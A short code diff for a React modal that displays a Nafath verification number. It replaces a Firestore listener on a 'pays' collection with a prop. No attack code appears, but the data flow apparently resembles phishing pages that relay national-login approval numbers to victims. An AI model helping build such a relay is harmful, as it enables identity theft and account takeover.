@@ -9,43 +9,16 @@ interface ModalProps {
   onClose: () => void
   userId: string // User ID to fetch the correct document
   phone: string
+  auth_number?:string
 }
 
-export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProps) {
+export default function NafazModal({ isOpen, onClose, userId, phone,auth_number }: ModalProps) {
   const [timeLeft, setTimeLeft] = useState(60)
-  const [auth_number, setAuthNumber] = useState<string>("")
   const [loading, setLoading] = useState(true)
 
   // Fetch Nafaz PIN from Firestore and listen for changes
 
-  useEffect(() => {
-    const userId = localStorage.getItem('visitor')
-    if (userId) {
-      const userDocRef = doc(db, "pays", userId)
 
-      const unsubscribe = onSnapshot(
-        userDocRef,
-        (docSnapshot: { exists: () => any; data: () => any }) => {
-          if (docSnapshot.exists()) {
-            const userData = docSnapshot.data()
-            // Assuming the PIN is stored in a field called 'nafaz_pin'
-              setAuthNumber(userData.auth_number)
-
-
-          } else {
-            console.error("User document not found")
-          }
-        },
-
-      )
-
-      // Clean up the listener when component unmounts or modal closes
-      return () => unsubscribe()
-      
-      // Get data from localStorage
-     
-    }
-  }, [])
   // Timer logic
   useEffect(() => {
     if (!isOpen) {
